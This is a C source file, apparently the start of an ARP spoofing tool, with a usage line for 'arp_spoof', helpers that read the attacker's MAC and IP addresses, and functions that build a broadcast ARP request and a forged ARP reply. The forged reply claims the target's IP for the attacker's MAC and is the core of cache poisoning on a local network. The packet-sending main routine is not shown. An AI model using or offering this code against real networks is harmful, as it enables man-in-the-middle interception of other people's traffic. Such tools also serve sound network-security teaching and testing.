#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/ioctl.h>
#include <net/if.h> 
#include <unistd.h>
#include <arpa/inet.h>
// https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program (Jamesprite, Charles Salvia)
// https://technote.kr/176

#include "arp_packet.h"

void usage() {
    printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void ip_str_to_addr(char * str, uint8_t * addr){
    int nowNum = 0, nowidx = 0;
    int str_len = strlen(str);
    for(int i = 0; i < str_len; i++){
        if(str[i] == '.'){
            addr[nowidx++] = nowNum;
            nowNum = 0;
            continue;
        }
        nowNum *= 10;
        nowNum += str[i] - '0';
    }
    addr[nowidx] = nowNum; // x.y.z.k 에서 k는 이 순간 저장
}

void get_attacker_mac_addr(uint8_t * attacker_mac_addr){
    struct ifreq ifr;
    struct ifconf ifc;
    char buf[1024];
    int success = 0;

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if (sock == -1) { /* handle error*/ };

    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }

    struct ifreq* it = ifc.ifc_req;
    const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

    for (; it != end; ++it) {
        strcpy(ifr.ifr_name, it->ifr_name);
        if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
            if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
                if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
                    success = 1;
                    break;
                }
            }
        }
        else { /* handle error */ }
    }
    if (success) memcpy(attacker_mac_addr, ifr.ifr_hwaddr.sa_data, 6);
};
void get_attacker_ip_addr(uint8_t * attacker_ip_addr, char * dev){
    struct ifreq ifr;
    char ipstr[40];
    int s;
 
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
    } 
    else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr,sizeof(struct sockaddr));
        ip_str_to_addr(ipstr, attacker_ip_addr);
    }
};

void copy_6byte(uint8_t * src, uint8_t * dst){
    for(int i = 0; i < 6; i++){
        dst[i] = src[i];
    }
}
void copy_4byte(uint8_t * src, uint8_t * dst){
    for(int i = 0; i < 4; i++){
        dst[i] = src[i];
    }
}
void copy_6byte_by_one_bit(uint8_t bit, uint8_t * dst){
    for(int i = 0; i < 6; i++){
        dst[i] = bit;
    }
}
void copy_4byte_by_one_bit(uint8_t bit, uint8_t * dst){
    for(int i = 0; i < 4; i++){
        dst[i] = bit;
    }
}

arp_packet arp_request_get_mac_addr
(uint8_t * attacker_mac, uint8_t * object_ip, uint8_t * attacker_ip){ // dst_mac 을 모르는 상황
    arp_packet send_packet;

    copy_6byte_by_one_bit(0xff, send_packet.destination_mac_address);
    copy_6byte(attacker_mac, send_packet.source_mac_address);
    send_packet.ethertype = htons(Ethertype_ARP); // 2byte
    send_packet.hardware_type = htons(ARP_hardware_type_Ethernet); // 2byte
    send_packet.protocol_type = htons(Ethertype_IPv4); // 2byte
    send_packet.hardware_length = MAC_address_length; // 1byte
    send_packet.protocol_length = IPv4_address_length; // 1byte
    send_packet.operation = htons(ARP_operation_request); // 2byte
    copy_6byte(attacker_mac, send_packet.sender_hardware_address);
    copy_4byte(attacker_ip, send_packet.sender_protocol_address);
    copy_6byte_by_one_bit(0x00, send_packet.target_hardware_address);
    copy_4byte(object_ip, send_packet.target_protocol_address);
    
    return send_packet;
}

arp_packet arp_reply_target_ip_with_attacker_mac
(uint8_t * attacker_mac, uint8_t * sender_mac, uint8_t * target_ip, uint8_t * sender_ip){
    arp_packet send_packet;

    copy_6byte(sender_mac, send_packet.destination_mac_address);
    copy_6byte(attacker_mac, send_packet.source_mac_address);
    send_packet.ethertype = htons(Ethertype_ARP); // 2byte
    send_packet.hardware_type = htons(ARP_hardware_type_Ethernet); // 2byte
    send_packet.protocol_type = htons(Ethertype_IPv4); // 2byte
    send_packet.hardware_length = MAC_address_length; // 1byte
    send_packet.protocol_length = IPv4_address_length; // 1byte
    send_packet.operation = htons(ARP_operation_reply); // 2byte

    copy_6byte(attacker_mac, send_packet.sender_hardware_address);
    copy_4byte(target_ip, send_packet.sender_protocol_address);
    copy_6byte(sender_mac, send_packet.target_hardware_address);
    copy_4byte(sender_ip, send_packet.target_protocol_address);

    return send_packet;
}

void print_6byte_mac(uint8_t * source){
    for(int i = 0; i < 6; i++){
        printf("%02x", source[i]);
        if(i != 5) printf(":");
        else printf("\n");
    }
}